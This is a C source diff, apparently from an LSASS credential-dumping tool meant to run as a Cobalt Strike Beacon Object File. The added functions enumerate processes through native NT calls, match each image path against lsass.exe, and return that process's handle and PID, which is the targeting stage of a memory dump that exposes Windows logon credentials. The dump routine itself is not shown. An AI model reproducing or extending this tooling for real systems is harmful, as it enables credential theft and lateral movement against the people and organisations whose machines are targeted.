@@ -1,6 +1,162 @@
 #include "../include/utils.h"
 #include "../include/syscalls.h"
 
+PVOID get_process_image(HANDLE hProcess)
+{
+    NTSTATUS status;
+    ULONG BufferLength = 0x200;
+    PVOID buffer;
+    do
+    {
+        buffer = intAlloc(BufferLength);
+        if (!buffer)
+        {
+#ifdef DEBUG
+#ifdef BOF
+            BeaconPrintf(CALLBACK_ERROR,
+#else
+            printf(
+#endif
+                "Failed to call HeapAlloc for 0x%llx bytes, error: %ld\n",
+                BufferLength,
+                GetLastError()
+            );
+#endif
+            return NULL;
+        }
+        status = NtQueryInformationProcess(
+            hProcess,
+            ProcessImageFileName,
+            buffer,
+            BufferLength,
+            &BufferLength
+        );
+        if (NT_SUCCESS(status))
+            return buffer;
+
+        intFree(buffer); buffer = NULL;
+    } while (status == STATUS_INFO_LENGTH_MISMATCH);
+
+#ifdef DEBUG
+#ifdef BOF
+    BeaconPrintf(CALLBACK_ERROR,
+#else
+    printf(
+#endif
+        "Failed to call NtQueryInformationProcess, status: 0x%lx\n",
+        status
+    );
+#endif
+    return NULL;
+}
+
+BOOL is_lsass(HANDLE hProcess)
+{
+    PUNICODE_STRING image = get_process_image(hProcess);
+    if (!image)
+        return FALSE;
+
+    if (image->Length == 0)
+    {
+        intFree(image); image = NULL;
+        return FALSE;
+    }
+
+    if (wcsstr(image->Buffer, L"\\Windows\\System32\\lsass.exe"))
+    {
+        intFree(image); image = NULL;
+        return TRUE;
+    }
+
+    intFree(image); image = NULL;
+    return FALSE;
+}
+
+HANDLE find_lsass(DWORD dwFlags)
+{
+    // loop over each process
+    HANDLE hProcess = NULL;
+    while (TRUE)
+    {
+        NTSTATUS status = NtGetNextProcess(
+            hProcess,
+            dwFlags,
+            0,
+            0,
+            &hProcess
+        );
+        if (status == STATUS_NO_MORE_ENTRIES)
+        {
+#ifdef BOF
+            BeaconPrintf(CALLBACK_ERROR,
+#else
+            printf(
+#endif
+                "The LSASS process was not found.\n"
+            );
+            return NULL;
+        }
+        if (!NT_SUCCESS(status))
+        {
+#ifdef DEBUG
+#ifdef BOF
+            BeaconPrintf(CALLBACK_ERROR,
+#else
+            printf(
+#endif
+                "Failed to call NtGetNextProcess, status: 0x%lx\n",
+                status
+            );
+#endif
+            return NULL;
+        }
+        if (is_lsass(hProcess))
+            return hProcess;
+    }
+}
+
+DWORD get_pid(
+    HANDLE hProcess
+)
+{
+    PROCESS_BASIC_INFORMATION basic_info;
+    PROCESSINFOCLASS ProcessInformationClass = 0;
+    NTSTATUS status = NtQueryInformationProcess(
+        hProcess,
+        ProcessInformationClass,
+        &basic_info,
+        sizeof(PROCESS_BASIC_INFORMATION),
+        NULL
+    );
+    if (!NT_SUCCESS(status))
+    {
+#ifdef DEBUG
+#ifdef BOF
+        BeaconPrintf(CALLBACK_ERROR,
+#else
+        printf(
+#endif
+            "Failed to call NtQueryInformationProcess, status: 0x%lx\n",
+            status
+        );
+#endif
+        return 0;
+    }
+
+    return basic_info.UniqueProcessId;
+}
+
+DWORD get_lsass_pid(void)
+{
+    DWORD pid;
+    HANDLE hProcess = find_lsass(PROCESS_QUERY_INFORMATION);
+    if (!hProcess)
+        return 0;
+    pid = get_pid(hProcess);
+    NtClose(hProcess); hProcess = NULL;
+    return pid;
+}
+
 void print_success(LPCSTR dump_name, BOOL use_valid_sig, BOOL do_write, BOOL is_BOF)
 {
     if (!use_valid_sig)
